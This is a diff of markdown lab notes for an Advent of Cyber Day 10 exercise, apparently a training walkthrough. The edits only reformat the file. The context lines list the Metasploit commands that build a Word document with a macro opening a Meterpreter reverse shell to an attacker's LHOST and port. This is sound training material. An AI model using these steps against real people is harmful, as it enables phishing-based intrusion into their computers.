@@ -1,4 +1,4 @@
-## He had a brain full of macros, and had shells in his soul.
+# He had a brain full of macros, and had shells in his soul
 
 [Crush Advent of Cyber Day 10 (Catch that Sweet Rev Shell)](https://www.youtube.com/watch?v=egM0Emlgvkw)
 
@@ -10,7 +10,7 @@ You will use the Metasploit Framework to create the document with the maliciou
 
 - Open a new terminal window and run `msfconsole` to start the Metasploit Framework
 - `set payload windows/meterpreter/reverse_tcp` specifies the payload to use; in this case, it connects to the specified host and creates a reverse shell  
-    
+
 - `use exploit/multi/fileformat/office_word_macro` specifies the exploit you want to use. Technically speaking, this is not an exploit; it is a module to create a document with a macro
 - `set LHOST <IP>` specifies the IP address of the attacker’s system.
 - `set LPORT 8888` specifies the port number you are going to listen on for incoming connections on the AttackBox.
@@ -18,4 +18,4 @@ You will use the Metasploit Framework to create the document with the maliciou
 - `exploit` generates a macro and embeds it in a document
 - `exit` to quit and return to the terminal.
 
-![[MS Macro.png]]
+![MS Macro.png](./Images/MS%20Macro.png)
